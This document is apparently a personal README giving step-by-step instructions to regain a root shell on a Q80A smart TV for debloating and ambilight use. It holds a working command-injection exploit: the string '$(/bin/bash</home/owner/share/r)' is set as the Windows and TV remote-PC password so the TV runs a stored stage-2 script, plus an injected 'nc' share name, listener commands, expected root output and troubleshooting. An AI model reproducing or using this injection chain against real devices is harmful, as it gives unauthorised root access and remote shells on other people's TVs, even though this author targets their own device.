# Re-root Kit — Q80A

The stage-2 is **already on the TV** at `/home/owner/share/r` (`/opt` partition, survives reboot).
Re-rooting = repeating the injection only. Estimated time: ~3 min.

> **Ambilight auto-start**: the stage-2 also launches `WledAmbi.exe` (WLED ambilight,
> `docs/WLED-AMBILIGHT.md`) in the background — one Shared Folder click gives you
> root shell + running ambilight. Kill it with `pkill -f WledAmbi` if unwanted.


## Prerequisites (one-time)

- TV and PC on the same LAN (TV `192.168.3.191`, PC `192.168.3.200`)
- RDP enabled on Windows — `setup-rdp.ps1` configures it
- Emergency account exists, is admin and was tested at the login screen (do not store its password in a public repo)
- Python on the PC for the listeners

## Procedure

### 1. Start the listeners (PC)

```powershell
cd C:\Users\rpf16\q80a_debloat\kit
start python listener.py   # 9998 shell + 9999 marker
start python bridge.py     # 9997 control <-> 9998
```

### 2. Set the payload password (admin PowerShell)

```powershell
$sec = ConvertTo-SecureString '$(/bin/bash</home/owner/share/r)' -AsPlainText -Force
Set-LocalUser -Name 'rpf16' -Password $sec
```

> Your password goes back to normal afterwards (step 5). Windows Hello PIN keeps working.
> If anything goes wrong: log in locally with the emergency account and `Set-LocalUser rpf16` restores it.

### 3. On the TV

- Remote PC → PC profile (`192.168.3.200`, user `rpf16`)
- Edit the profile password to: `$(/bin/bash</home/owner/share/r)` — exactly this, no spaces
- Connect → top toolbar → **Shared Folder**

### 4. Confirm

- `9999`: `STAGE2-OK` = injection executed
- `9998`: `bash-3.2#` = root shell active
- Commands: `python send-cmd.py "pkgcmd -l | head"` (see `send-cmd.py`)

### 5. After use — restore the password and clean up

```powershell
$sec = ConvertTo-SecureString 'YOUR_NORMAL_PASSWORD' -AsPlainText -Force
Set-LocalUser -Name 'rpf16' -Password $sec
Remove-SmbShare -Name 'x$(nc 192.168.3.200 9998)' -Force -ErrorAction SilentlyContinue
# Stop the listeners (Ctrl+C on the windows)
```

## Known failures

| Symptom | Cause | Fix |
|---|---|---|
| Shared Folder lists folders but nothing arrives | TV profile password differs from the Windows one | retype the payload on both sides |
| `/bin/bash,-i` on the listener | payload with a space (becomes a comma) | use only `$(/bin/bash<...)` |
| Nothing on 9998 but `uid=0` on 9999 | injection OK, payload broken | check the `r` file on the TV; re-push via SDB/dev mode |
| Shell dropped | reboot/RDP loss | repeat from step 3 |
| Windows lockout | payload password + no fallback | emergency account at the login screen |

## Re-pushing stage-2 (if the TV loses the `r` file)

With Developer Mode active (host = your PC IP):

```powershell
cd C:\Users\rpf16\q80a_debloat\.tools\tvroot
python tvroot.py push ..\..\kit\stage2.sh /home/owner/share/r
```

(uses `sdb_wire.py` — SDB over TCP 26101; only push works)
